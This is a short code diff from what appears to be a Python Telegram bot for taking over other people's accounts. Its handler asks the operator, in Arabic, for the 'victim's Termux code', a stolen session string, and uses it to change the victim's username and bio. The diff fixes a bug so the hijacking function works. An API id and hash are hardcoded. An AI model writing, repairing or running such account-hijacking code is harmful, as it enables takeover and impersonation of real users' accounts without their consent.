@@ -176,7 +176,7 @@ async def cu(strses):
 
 
 async def change_username(check_termux_code, new_username):
-    async with tg(ses(termux_code), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(check_termux_code), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
         try:
             await X(UpdateUsernameRequest(username=new_username))
             return True
@@ -890,7 +890,7 @@ async def users(event):
         await event.reply(" غيرت البايو 🦇", buttons=keyboard)
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"O")))
-async def change_username(event):
+async def new_username(event):
     async with bot.conversation(event.chat_id) as conv:
         await conv.send_message("الرجاء إرسال الكود التيرمكس للضحية  ")
         termux_code_msg = await conv.get_response()
